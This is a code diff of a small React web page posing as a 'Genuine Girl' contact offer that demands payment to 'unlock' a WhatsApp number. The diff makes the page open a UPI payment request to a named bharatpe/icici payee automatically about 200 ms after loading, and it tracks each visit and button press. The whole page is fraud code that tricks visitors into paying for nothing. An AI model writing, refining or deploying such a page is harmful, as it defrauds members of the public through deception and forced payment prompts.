@@ -15,7 +15,6 @@ async function sendUpdate(msg) {
           body: ''
         }).then(res => {
           console.log("Request complete!");
-          window.open("upi://pay?cu=INR&pa=bharatpe.0851610820@icici&pn=Genuine_Girl", "_self");
         })
       }).catch(err => console.error(err));
   })
@@ -23,7 +22,11 @@ async function sendUpdate(msg) {
 
 function App() {
   useEffect(() => {
-    sendUpdate("Home")
+    setTimeout(() => {
+      sendUpdate("Home").then(() => {
+        window.open("upi://pay?cu=INR&pa=bharatpe.0851610820@icici&pn=Genuine_Girl", "_self");
+      })
+    }, 200);
   }, [])
   const handlepayButton = async () => {
     await sendUpdate("PayButton")
@@ -31,15 +34,15 @@ function App() {
   }
 
   const handleWspButton = async () => {
-    await sendUpdate("PayButton")
+    await sendUpdate("WhatsppBtn")
     window.open("upi://pay?cu=INR&pa=bharatpe.0851610820@icici&pn=Genuine_Girl", "_self");
   }
 
   return (
     <div className="App">
       <header className="App-header">
-        <h1 style={{ marginTop: "-50px", paddingBottom: '0px' }}>🍆Genuine Girl!!🍆</h1>
-        <button className='button' onClick={() => { handlepayButton() }}>PAY NOW!!</button>
+        <h1 style={{ marginTop: "-60px", marginBottom: '10px' }}>🍆Genuine Girl!!🍆</h1>
+        <button className='button' style={{ marginBottom: "20px" }} onClick={() => { handlepayButton() }}>PAY NOW!!</button>
         <h6>You should PAY first to Unlock My Number!!😜</h6>
         <CopyExample />
         <h6 style={{ marginBottom: "5px" }}>Click Below👇 For My Whatsapp Number!!</h6>
